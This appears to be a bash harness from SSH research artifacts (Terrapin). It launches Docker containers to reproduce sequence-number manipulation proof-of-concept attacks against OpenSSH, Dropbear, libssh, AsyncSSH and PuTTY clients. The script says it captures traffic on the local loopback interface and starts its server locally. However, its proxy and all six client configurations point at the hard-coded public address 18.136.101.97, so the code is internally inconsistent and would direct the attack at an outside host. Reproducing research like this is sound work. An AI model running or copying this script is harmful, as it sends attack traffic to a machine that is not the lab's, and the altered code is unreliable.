#!/bin/bash

SERVER_IMPL_NAME="OpenSSH 9.5p1"
SERVER_IMAGE="terrapin-artifacts/openssh-server:9.5p1"
SERVER_CONTAINER_NAME="terrapin-artifacts-server"
SERVER_PORT=22

POC_CONTAINER_NAME="terrapin-artifacts-poc"
POC_PORT=21

CLIENT_CONTAINER_NAME="terrapin-artifacts-client"

function ensure_images {
  bash $(dirname "$0")/../impl/build.sh
  bash $(dirname "$0")/../pocs/build.sh
}

function print_info {
  echo
  echo "--- SSH sequence number manipulation techniques PoC ---"
  echo
  echo "[i] This script can be used to reproduce the evaluation results presented in section 4.1 of the paper"
  echo "[i] The script will perform the following steps:"
  echo -e "\t 1. Start $SERVER_IMPL_NAME server on port $SERVER_PORT"
  echo -e "\t 2. Select and start PoC proxy on port $POC_PORT"
  echo -e "\t 3. Select and start an SSH client to connect to the PoC proxy"
  echo "[i] All container will run in --network host to allow for easy capturing via Wireshark on the lo interface"
  echo "[i] Make sure that ports $SERVER_PORT and $POC_PORT on the host are available and can be used by the containers"
  echo
  echo "[i] Note that all PoCs available will result in the connection terminating due to sequence number mismatch"
  echo "[i] This is expected and intended behaviour as these PoCs are designed to check wrap-around detection, timeouts, ..."
  echo
}

function start_ssh_server {
  echo "[+] Starting $SERVER_IMPL_NAME server on port $SERVER_PORT"
  docker run -d \
    --rm \
    --network host \
    --name $SERVER_CONTAINER_NAME \
    $SERVER_IMAGE -p $SERVER_PORT > /dev/null 2>&1
}

function select_poc_proxy {
  echo "[i] This script supports the following sequence number manipulations as PoC:"
  echo -e "\t1) RcvIncrease"
  echo -e "\t2) RcvDecrease"
  echo -e "\t3) SndIncrease"
  echo -e "\t4) SndDecrease"
  read -p "[+] Please select PoC variant to test [1-4]: " POC_VARIANT

  case $POC_VARIANT in
    1)
      POC_VARIANT_NAME="RcvIncrease"
      POC_IMAGE="terrapin-artifacts/sqn-rcv-increase" ;;
    2)
      POC_VARIANT_NAME="RcvDecrease"
      POC_IMAGE="terrapin-artifacts/sqn-rcv-decrease" ;;
    3)
      POC_VARIANT_NAME="SndIncrease"
      POC_IMAGE="terrapin-artifacts/sqn-snd-increase" ;;
    4)
      POC_VARIANT_NAME="SndDecrease"
      POC_IMAGE="terrapin-artifacts/sqn-snd-decrease" ;;
    *)
      echo "[!] Invalid selection, please re-run the script"
      exit 1 ;;
  esac
  echo "[+] Selected PoC variant: '$POC_VARIANT_NAME'"

  read -p "[+] Please choose a natural number N between 0 and 2^32 to increase or decrease the sequence number by: " DECREASE_INCREASE_BY
}

function run_poc_proxy {
  if [[ $POC_VARIANT -eq 1 ]] || [[ $POC_VARIANT -eq 2 ]]; then
    docker run \
      --rm \
      --network host \
      --name $POC_CONTAINER_NAME \
      $POC_IMAGE --proxy-port $POC_PORT --server-ip "18.136.101.97" --server-port $SERVER_PORT -N $DECREASE_INCREASE_BY &
  else
    docker run \
      --rm \
      --network host \
      --name $POC_CONTAINER_NAME \
      $POC_IMAGE --proxy-port $POC_PORT --server-ip "18.136.101.97" --server-port $SERVER_PORT -N $DECREASE_INCREASE_BY --unknown-id $UNKNOWN_ID &  
  fi
}

function select_client {
  echo "[i] This script supports the following SSH client implementations:"
  echo -e "\t1) AsyncSSH 2.13.2"
  echo -e "\t2) Dropbear 2022.83"
  echo -e "\t3) libssh 0.10.5"
  echo -e "\t4) OpenSSH 9.4p1"
  echo -e "\t5) OpenSSH 9.5p1"
  echo -e "\t6) PuTTY 0.79"
  read -p "[+] Please select client implementation to test [1-6]: " CLIENT_IMPL

  case $CLIENT_IMPL in
    1)
      CLIENT_IMPL_NAME="AsyncSSH 2.13.2"
      CLIENT_IMAGE="terrapin-artifacts/asyncssh-client:2.13.2"
      ARGS="--host 18.136.101.97 --port $POC_PORT --username victim"
      UNKNOWN_ID="09" ;;
    2)
      CLIENT_IMPL_NAME="Dropbear 2022.83"
      CLIENT_IMAGE="terrapin-artifacts/dropbear-client:2022.83"
      ARGS="-p $POC_PORT victim@18.136.101.97"
      UNKNOWN_ID="C0" ;;
    3)
      CLIENT_IMPL_NAME="libssh 0.10.5"
      CLIENT_IMAGE="terrapin-artifacts/libssh-client:0.10.5" 
      ARGS="-p $POC_PORT victim@18.136.101.97"
      UNKNOWN_ID="C0" ;;
    4)
      CLIENT_IMPL_NAME="OpenSSH 9.4p1"
      CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.4p1"
      ARGS="-p $POC_PORT victim@18.136.101.97"
      UNKNOWN_ID="09" ;;
    5)
      CLIENT_IMPL_NAME="OpenSSH 9.5p1"
      CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.5p1"
      ARGS="-p $POC_PORT victim@18.136.101.97"
      UNKNOWN_ID="09" ;;
    6)
      CLIENT_IMPL_NAME="PuTTY 0.79"
      CLIENT_IMAGE="terrapin-artifacts/putty-client:0.79"
      ARGS="-P $POC_PORT victim@18.136.101.97"
      UNKNOWN_ID="C0" ;;
    *)
      echo "[!] Invalid selection, please re-run the script"
      exit 1 ;;
  esac
  echo "[+] Selected client implementation: '$CLIENT_IMPL_NAME'"
}

function run_client {
  docker run \
    --rm \
    --network host \
    --name $CLIENT_CONTAINER_NAME \
    $CLIENT_IMAGE $ARGS
  echo "[+] Client terminated, PoC done"
}

function cleanup {
  echo "[+] Stopping any remaining artifact containers"
  docker stop \
    $SERVER_CONTAINER_NAME \
    $POC_CONTAINER_NAME \
    $CLIENT_CONTAINER_NAME > /dev/null 2>&1
}

ensure_images
print_info
start_ssh_server
select_poc_proxy
select_client
run_poc_proxy
sleep 5
run_client
cleanup
